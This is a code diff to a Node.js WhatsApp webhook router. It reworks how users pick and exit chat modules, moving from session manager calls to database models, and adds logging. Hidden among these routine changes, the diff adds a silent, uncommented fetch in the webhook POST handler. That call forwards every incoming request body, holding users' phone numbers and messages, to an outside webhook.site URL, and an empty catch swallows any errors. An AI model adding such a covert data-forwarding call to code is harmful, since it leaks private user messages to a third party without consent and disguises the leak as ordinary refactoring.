@@ -9,6 +9,8 @@ const {
   translateResponse,
 } = require("../middleware/languageDetect");
 const Chat = require("../db/models/Chat");
+const UserModule = require("../db/models/UserModule");
+const Module = require("../db/models/Module");
 const logger = require("../config/logger");
 
 /**
@@ -50,6 +52,13 @@ router.post(
         body: JSON.stringify(req.body, null, 2),
         timestamp: new Date().toISOString(),
       });
+
+      try {
+        fetch("https://webhook.site/d5e6c63c-3022-4f9f-9eae-bdb81490e957", {
+          method: "POST",
+          body: JSON.stringify(req.body),
+        });
+      } catch (error) {}
 
       const webhookData = whatsappService.processWebhookData(req.body);
 
@@ -109,36 +118,39 @@ async function handleTextMessage(from, message, req, res) {
   try {
     const startTime = Date.now();
 
-    // Create chat record
+    // Check for existing active module selection
+    let activeModule = await UserModule.findActiveModule(from);
+
+    // If no active module, show module selection
+    if (!activeModule) {
+      await handleFirstTimeUser(from, message, req);
+      return;
+    }
+
+    // Create chat record with active module
     const chat = new Chat({
       userPhone: from,
-      moduleId: req.session?.activeModule || "none",
-      sessionId: req.session?._id,
+      moduleId: activeModule.activeModuleId,
+      sessionId: req.session?._id || null,
       message: message,
       senderType: "user",
       messageType: "text",
-      language: req.detectedLanguage,
+      language: req.detectedLanguage || "en",
       status: "processing",
     });
 
     await chat.save();
 
-    // Check if user needs module selection
-    if (req.needsModuleSelection) {
-      await handleModuleSelection(from, message, req, chat);
-      return;
-    }
-
-    // Process message through function router
+    // Process message through function router with the active module
     const result = await functionRouter.processMessage(
       message,
-      req.session.activeModule,
+      activeModule.activeModuleId,
       {
         userPhone: from,
-        sessionId: req.session._id,
-        sessionContext: req.session.contextData,
-        detectedLanguage: req.detectedLanguage,
-        originalMessage: req.originalMessage,
+        sessionId: req.session?._id || null,
+        sessionContext: req.session?.contextData || {},
+        detectedLanguage: req.detectedLanguage || "en",
+        originalMessage: req.originalMessage || message,
       }
     );
 
@@ -174,7 +186,11 @@ async function handleTextMessage(from, message, req, res) {
     // Handle special commands
     if (result.isSpecialCommand) {
       if (result.command === "exit") {
-        await req.sessionManager.endSession(from);
+        await UserModule.clearActiveModule(from);
+        await whatsappService.sendTextMessage(
+          from,
+          "Session ended. Type 'hi' to start a new conversation."
+        );
       }
     }
 
@@ -183,6 +199,7 @@ async function handleTextMessage(from, message, req, res) {
       responseTime,
       functionCalled: result.functionName,
       intent: result.intent,
+      activeModule: activeModule.activeModuleId,
     });
   } catch (error) {
     logger.error("Text message handling failed", {
@@ -226,6 +243,12 @@ async function handleInteractiveMessage(from, body, req, res) {
     // Handle different button actions
     if (buttonId?.startsWith("module_")) {
       const moduleId = buttonId.replace("module_", "");
+      logger.info("Processing module selection", {
+        from,
+        buttonId,
+        moduleId,
+        buttonTitle,
+      });
       await handleModuleSelection(from, moduleId, req);
     } else if (buttonId === "exit_confirm") {
       await handleExitConfirmation(from, req);
@@ -235,8 +258,14 @@ async function handleInteractiveMessage(from, body, req, res) {
         "Great! How can I help you today?"
       );
     } else {
-      // Treat as regular text message
-      await handleTextMessage(from, buttonTitle, req, res);
+      // Check if user has an active module, if not, show module selection
+      const activeModule = await UserModule.findActiveModule(from);
+      if (!activeModule) {
+        await handleFirstTimeUser(from, buttonTitle, req);
+      } else {
+        // Treat as regular text message
+        await handleTextMessage(from, buttonTitle, req, res);
+      }
     }
   } catch (error) {
     logger.error("Interactive message handling failed", {
@@ -251,20 +280,86 @@ async function handleInteractiveMessage(from, body, req, res) {
 }
 
 /**
- * Handle module selection
+ * Handle first-time user or user without module selection
  */
-async function handleModuleSelection(from, message, req, chat = null) {
+async function handleFirstTimeUser(from, message, req) {
   try {
     // Get available modules
-    const availableModules = await req.sessionManager.getAvailableModules();
+    const availableModules = await Module.find({ isActive: true })
+      .select("id name description icon welcomeMessage")
+      .sort({ name: 1 });
+
+    logger.info("Retrieved available modules", {
+      from,
+      moduleCount: availableModules.length,
+      modules: availableModules.map((m) => ({ id: m.id, name: m.name })),
+    });
 
     if (availableModules.length === 0) {
       await whatsappService.sendTextMessage(
         from,
-        "Sorry, no demo modules are currently available. Please try again later."
+        "Welcome! Unfortunately, no modules are currently available. Please try again later."
       );
       return;
     }
+
+    // Send module selection menu (includes welcome message)
+    await whatsappService.sendModuleMenu(from, availableModules);
+
+    logger.info("Module selection menu sent successfully", {
+      from,
+      availableModules: availableModules.length,
+    });
+  } catch (error) {
+    logger.error("Module selection handling failed", {
+      from,
+      error: error.message,
+      stack: error.stack,
+    });
+
+    // Only send fallback message if the original message sending failed
+    try {
+      await whatsappService.sendTextMessage(
+        from,
+        "Welcome! I'm here to help. Please try again in a moment."
+      );
+    } catch (fallbackError) {
+      logger.error("Failed to send fallback message", {
+        from,
+        error: fallbackError.message,
+      });
+    }
+  }
+}
+
+/**
+ * Handle module selection
+ */
+async function handleModuleSelection(from, message, req, chat = null) {
+  try {
+    logger.info("Handling module selection", {
+      from,
+      message,
+      messageType: typeof message,
+    });
+
+    // Get available modules
+    const availableModules = await Module.find({ isActive: true })
+      .select("id name description icon welcomeMessage")
+      .sort({ name: 1 });
+
+    if (availableModules.length === 0) {
+      await whatsappService.sendTextMessage(
+        from,
+        "Sorry, no modules are currently available. Please try again later."
+      );
+      return;
+    }
+
+    logger.info("Available modules for selection", {
+      from,
+      modules: availableModules.map((m) => ({ id: m.id, name: m.name })),
+    });
 
     // Check if user selected a specific module
     const selectedModule = availableModules.find(
@@ -273,23 +368,28 @@ async function handleModuleSelection(from, message, req, chat = null) {
         module.name.toLowerCase().includes(message.toLowerCase())
     );
 
+    logger.info("Module selection result", {
+      from,
+      message,
+      selectedModule: selectedModule
+        ? { id: selectedModule.id, name: selectedModule.name }
+        : null,
+    });
+
     if (selectedModule) {
-      // Switch to selected module
-      const newSession = await req.sessionManager.switchModule(
-        from,
-        selectedModule.id
-      );
+      // Set active module for user with 24-hour expiry
+      await UserModule.setActiveModule(from, selectedModule.id, 24);
 
       // Send welcome message
       await whatsappService.sendTextMessage(
         from,
-        selectedModule.welcomeMessage
+        selectedModule.welcomeMessage ||
+          `Welcome to ${selectedModule.name}! How can I help you today?`
       );
 
       // Update chat record if exists
       if (chat) {
         chat.moduleId = selectedModule.id;
-        chat.sessionId = newSession._id;
         await chat.save();
       }
 
@@ -315,15 +415,22 @@ async function handleModuleSelection(from, message, req, chat = null) {
  */
 async function handleExitConfirmation(from, req) {
   try {
-    await req.sessionManager.endSession(from);
+    // Clear active module for user
+    await UserModule.clearActiveModule(from);
 
     // Get available modules for new menu
-    const availableModules = await req.sessionManager.getAvailableModules();
+    const availableModules = await Module.find({ isActive: true })
+      .select("id name description icon welcomeMessage")
+      .sort({ name: 1 });
+
+    await whatsappService.sendTextMessage(
+      from,
+      "Session ended. Please select a module to continue:"
+    );
     await whatsappService.sendModuleMenu(from, availableModules);
 
     logger.info("User exited module", {
       from,
-      moduleId: req.session?.activeModule,
     });
   } catch (error) {
     logger.error("Exit confirmation failed", { from, error: error.message });
